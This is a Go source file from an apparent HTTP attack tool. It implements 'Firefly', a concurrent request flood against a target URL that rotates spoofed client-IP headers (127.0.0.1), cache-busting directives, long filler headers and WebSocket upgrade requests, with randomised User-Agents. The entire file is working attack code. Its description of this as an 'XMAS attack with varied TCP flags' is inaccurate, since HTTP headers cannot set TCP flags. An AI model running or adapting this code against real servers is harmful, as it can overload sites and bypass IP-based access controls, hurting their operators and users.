package sting

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"vivarium/internal/common"
)

// Firefly implements the XMAS attack with varied TCP flags via HTTP headers.
// Lights up requests with unusual header combinations like bioluminescence.
type Firefly struct {
	client *http.Client
}

// NewFirefly creates a new Firefly attack instance.
func NewFirefly() *Firefly {
	return &Firefly{
		client: common.FastHTTPClient(),
	}
}

// Name returns the attack name.
func (f *Firefly) Name() string {
	return "Firefly"
}

// Description returns a brief description.
func (f *Firefly) Description() string {
	return "Firefly - lights up requests with varied unusual headers like bioluminescence"
}

// Attack executes the Firefly attack.
func (f *Firefly) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case idx, ok := <-jobs:
					if !ok {
						return
					}
					if f.sendRequest(ctx, target, idx) {
						successful.Add(1)
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%100 == 0 {
						fmt.Printf("\r   Progress: %d/%d requests", current, opts.Rounds)
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
	}, nil
}

// Header patterns that "light up" like a firefly's glow
var fireflyHeaders = []map[string]string{
	// All lights on
	{
		"X-Forwarded-For":  "127.0.0.1",
		"X-Originating-IP": "127.0.0.1",
		"X-Remote-IP":      "127.0.0.1",
		"X-Remote-Addr":    "127.0.0.1",
		"X-Client-IP":      "127.0.0.1",
		"X-Real-IP":        "127.0.0.1",
		"Cache-Control":    "no-cache, no-store, must-revalidate, max-age=0",
		"Pragma":           "no-cache",
		"Connection":       "keep-alive",
		"Accept-Encoding":  "gzip, deflate, br, zstd",
	},
	// Conflicting signals
	{
		"Accept":          "*/*",
		"Accept-Language": "*",
		"Accept-Encoding": "identity",
		"Cache-Control":   "max-age=99999999",
		"If-None-Match":   "*",
		"If-Match":        "*",
	},
	// Long glow patterns
	{
		"X-Glow-1": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"X-Glow-2": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
		"X-Glow-3": "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC",
		"X-Glow-4": "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD",
	},
	// Protocol flash
	{
		"Upgrade":               "websocket",
		"Connection":            "Upgrade",
		"Sec-WebSocket-Key":     "dGhlIHNhbXBsZSBub25jZQ==",
		"Sec-WebSocket-Version": "13",
	},
}

func (f *Firefly) sendRequest(ctx context.Context, target string, idx int) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", common.RandomUserAgent())

	// Apply rotating header patterns like firefly light patterns
	headers := fireflyHeaders[idx%len(fireflyHeaders)]
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	return true
}
